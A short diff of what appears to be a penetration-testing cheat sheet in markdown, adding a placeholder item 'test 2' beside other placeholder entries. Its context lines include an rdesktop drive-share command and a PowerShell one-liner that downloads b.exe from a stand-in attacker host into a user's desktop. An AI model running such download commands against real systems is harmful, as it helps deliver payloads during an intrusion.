@@ -134,6 +134,7 @@ $ rdesktop (ip) -r disk:share=/home/bayo/store
 ```powershell
 $ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"
 ```
+  * test 2
 	* test 13
 * test 456	
 * Download Cradle
